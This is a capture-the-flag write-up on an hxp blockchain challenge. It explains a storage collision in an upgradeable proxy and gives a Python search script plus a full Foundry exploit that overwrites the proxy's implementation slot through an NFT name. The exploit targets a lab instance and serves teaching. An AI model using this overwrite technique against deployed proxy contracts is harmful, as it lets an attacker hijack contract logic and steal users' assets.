# Storage collision in `respectable_nft`

## Introduction

This challenge involves exploiting a storage collision vulnerability in a proxy contract setup with an NFT implementation. The system consists of two main contracts:

- A proxy contract that handles upgrades and delegation
- An implementation contract (CryptoFlags) that allows minting NFTs (ERC721) and setting unbounded string names for these NFTs

The key aspect is that any storage changes in the implementation contract affect the proxy's storage due to how delegatecall works.

The proxy:

```js
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.20;

contract UpgradeableProxy {
    // keccak256("owner_storage");
    bytes32 public constant OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb;
    // keccak256("implementation_storage");
    bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6;

    struct AddressSlot {
        address value;
    }

    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    constructor() {
        AddressSlot storage owner = getAddressSlot(OWNER_STORAGE);
        owner.value = msg.sender;
    }

    function upgradeTo(address implementation) external {
        require(msg.sender == getAddressSlot(OWNER_STORAGE).value, "Only owner can upgrade");
        getAddressSlot(IMPLEMENTATION_STORAGE).value = implementation;
    }

    function _delegate(address implementation) internal {
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    fallback() external payable {
        _delegate(getAddressSlot(IMPLEMENTATION_STORAGE).value);
    }
}
```

and the implementation contract : 

```js
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.20;

import "./ERC721_flattened.sol";

contract CryptoFlags is ERC721 {

    // slot 6
    mapping(uint256 => string) public FlagNames;
    constructor()
        ERC721("CryptoFlags", "CTF")
    {

    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal override virtual {
        // only a mint
        require(from == address(0), "no flag sharing pls :^)");
        // ?
        to; tokenId;
    }

    function setFlagName(uint256 id, string memory name) external {
        require(ownerOf(id) == msg.sender, "Only owner can name the flag");
        require(bytes(FlagNames[id]).length == 0, "that flag already has a name");
        FlagNames[id] = name;
    }

    function claimFlag(uint256 id) external {
        require(id <= 100_000_000, "Only the first 100_000_000 ids allowed");
        _mint(msg.sender, id);
    }

    function isSolved() external pure returns (bool) {
        return false;
    }
}
```

## Understanding the Vulnerability

The goal is to create a storage collision between an NFT's name and the proxy's implementation address storage slot:

```js
// keccak256("implementation_storage");
bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6;
```

This is possible because we can set names for any NFT within the first 100,000,000 IDs.

### Storage Layout in EVM
Let's break down how storage works:

- EVM has 2^256 slots
- For mappings, values are stored at keccak256(key + slot) where slot is the declaration position:

```js
function findMapLocation(uint256 key, uint256 slot) public pure returns (uint256) {
            return uint256(keccak256(abi.encode(key, slot)));
        }
```

### String Storage Mechanics
Strings in Solidity can be stored in two ways:

- Short strings (≤32 bytes): Stored directly at the computed slot
- Long strings (>32 bytes):

    - Length stored at the computed slot
    - Actual data stored at keccak256(slot)



For our NFT with ID x, the storage locations would be:

```js
// Short string
uint256 slot = uint256(keccak256(abi.encode(x, 6)))

// Long string
uint256 slot = uint256(keccak256(abi.encode(x, 6)))
uint256 valueOffset = uint256(keccak256(abi.encode(slot)))
```

### Finding the Collision
I wrote a Python script to find potential collisions by checking all possible NFT IDs and string storage locations:

```python
import eth_utils
from eth_utils import keccak

def compute_mapping_slot(id, base_slot):
    # Convert parameters to bytes and pad to 32 bytes
    id_bytes = eth_utils.to_bytes(hexstr=hex(id)[2:].zfill(64))
    slot_bytes = eth_utils.to_bytes(hexstr=hex(base_slot)[2:].zfill(64))
    
    # Concatenate and hash
    concat = id_bytes + slot_bytes
    result = int.from_bytes(keccak(concat), 'big')
    return result


def find_closest_slots():
    OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb
    IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6
    
    # Storage slots for mappings in ERC721 and our contract
    FLAGNAMES_SLOT = 6  # seven storage slot for FlagNames mapping
    
    closest_to_owner = (float('inf'), None, None)
    closest_to_implementation = (float('inf'), None, None)
    
    # Test different IDs and string lengths
    for id in range(100_000_000):  # According to contract limit
        # Calculate storage slot for this ID's flag name
        storage_slot = compute_mapping_slot(id, FLAGNAMES_SLOT)
        
        
        # For strings <= 31 bytes (stored inline)
        if storage_slot < OWNER_STORAGE :
            diff_owner = abs(storage_slot - OWNER_STORAGE)
        
            if diff_owner < closest_to_owner[0]:
                closest_to_owner = (diff_owner, id, "short")

        if storage_slot < IMPLEMENTATION_STORAGE:
            diff_impl = abs(storage_slot - IMPLEMENTATION_STORAGE)
                
            if diff_impl < closest_to_implementation[0]:
                closest_to_implementation = (diff_impl, id, "short")
        
        # For strings > 32 bytes (stored at keccak of slot)
        dynamic_slot = int.from_bytes(keccak(storage_slot.to_bytes(32, 'big')), 'big')
        
        if dynamic_slot < OWNER_STORAGE :
            diff_owner = abs(dynamic_slot - OWNER_STORAGE)
            if diff_owner < closest_to_owner[0]:
                closest_to_owner = (diff_owner, id, "long")
        

        if dynamic_slot < IMPLEMENTATION_STORAGE:
            diff_impl = abs(dynamic_slot - IMPLEMENTATION_STORAGE)
            if diff_impl < closest_to_implementation[0]:
                closest_to_implementation = (diff_impl, id, "long")
        
        # Progress indicator every million iterations
        if id % 1_000_000 == 0:
            print(f"Processed {id:,} IDs...")
    
    return closest_to_owner, closest_to_implementation

def main():
    print("Starting analysis...")
    owner_result, impl_result = find_closest_slots()
    
    print("\nResults:")
    print(f"\nClosest to OWNER_STORAGE:")
    print(f"Difference: {owner_result[0]}")
    print(f"ID: {owner_result[1]}")
    print(f"String type: {owner_result[2]}")
    
    print(f"\nClosest to IMPLEMENTATION_STORAGE:")
    print(f"Difference: {impl_result[0]}")
    print(f"ID: {impl_result[1]}")
    print(f"String type: {impl_result[2]}")

if __name__ == "__main__":
    main()
```

The script found that NFT `ID 56488061` with a long string would give us a collision at `offset 141` from the implementation storage slot:

```bash
Results:

Closest to OWNER_STORAGE:
Difference: 602641329853891472628429529548778136057339432943191408590826256368928
ID: 16665064
String type: short

Closest to IMPLEMENTATION_STORAGE:
Difference: 141
ID: 56488061
String type: long
```

### Exploitation
Here's the exploit contract that leverages this finding:

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../src/Setup.sol";
import {CryptoFlags} from "../src/CryptoFlags.sol";

contract SolveScript is Script {
    Setup setup;
    CryptoFlags cryptoFlags;
    Soluce soluce;
    function setUp() public {}

    function run() public virtual {
        uint256 id = 56488061;
        vm.startBroadcast();
        setup = Setup(0x98f075BB612c9A5F92d253C798B6345A9ecebF29);
        soluce = new Soluce();

        cryptoFlags = setup.cryptoFlags();
        cryptoFlags.claimFlag(id);


        /* Closest to IMPLEMENTATION_STORAGE:
        Difference: 141
        ID: 56488061
        String type: long */

        // full 141 slot
        bytes memory payload = hex"";
        for (uint i; i < 141; i++){
            payload = bytes.concat(payload, hex'0000000000000000000000000000000000000000000000000000000000000000');
        }
        payload = bytes.concat(payload, bytes32(uint256(uint160(address(soluce)))));

        cryptoFlags.setFlagName(id, string(payload));

        bytes32 addr = vm.load(address(cryptoFlags), bytes32(0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6));
        require(address(addr) == address(soluce), "impl addr didn't change");

        vm.stopBroadcast();

        require(setup.isSolved(), "did not solve :'(");
    }
}

contract Soluce {

    function isSolved() external pure returns (bool) {
        return true;
    }

}
```

Running the exploit gave us the flag:

```bash
nc 10.244.0.1 1234
hxp{n3v3r_7ru57_pr3c0mpu73d_v4lu35}
```

Thanks for reading! Looking forward to sharing more blockchain exploitation and reverse engineering challenges with you in the future.